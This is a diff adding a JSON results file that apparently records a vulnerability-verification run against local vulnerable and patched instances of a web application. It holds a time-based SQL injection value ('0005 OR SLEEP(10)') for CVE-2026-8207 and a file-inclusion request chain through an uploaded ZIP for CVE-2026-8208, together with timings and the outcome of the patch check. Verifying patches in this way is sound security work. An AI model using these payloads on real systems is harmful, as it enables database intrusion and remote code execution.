@@ -1,0 +1,53 @@
+{
+  "vuln": "http://127.0.0.1:8081",
+  "patched": {
+    "base_url": "http://127.0.0.1:8082",
+    "login_ok": true,
+    "tracking_page_ok": true,
+    "sqli_neutralized": true,
+    "sqli_seconds": 5.13,
+    "normal_archive_created": true,
+    "archive_id": "9",
+    "uploaded_temp_path": "uploads/temp/spicy.php_fX0bQkmb5706a2SI.zip",
+    "lfi_marker_observed": false,
+    "lfi_blocked": true,
+    "result": "PATCH_VERIFIED"
+  },
+  "lfi": {
+    "case": "CVE-2026-8208",
+    "chain": "archive path -> ZIP upload -> temp include",
+    "archive_id": "8",
+    "uploaded_file": "legit_files/temp/spicy.php_rLHprFTTWw2KyVqL.zip",
+    "request_url": "http://127.0.0.1:8081/index.php?q=/legit_files/temp/spicy.php_rLHprFTTWw2KyVqL.zip",
+    "http_status": 200,
+    "response_bytes": 43052,
+    "marker": "TRIDENT_LFI_OK",
+    "marker_observed": true,
+    "result": "VULNERABLE"
+  },
+  "sqli": {
+    "case": "CVE-2026-8207",
+    "sink": "modules/Tracking/graphing.php SQL construction from gibbonDepartmentIDs[]",
+    "baseline": {
+      "department_ids": [
+        "0005"
+      ],
+      "http_status": 200,
+      "seconds": 4.93,
+      "response_bytes": 140090
+    },
+    "injected": {
+      "department_ids": [
+        "0005",
+        "0005 OR SLEEP(10)"
+      ],
+      "http_status": 200,
+      "seconds": 23.48,
+      "response_bytes": 140090
+    },
+    "delta_seconds": 18.54,
+    "threshold_seconds": 8.0,
+    "result": "VULNERABLE"
+  },
+  "result": "FULL_CASE_VERIFIED"
+}
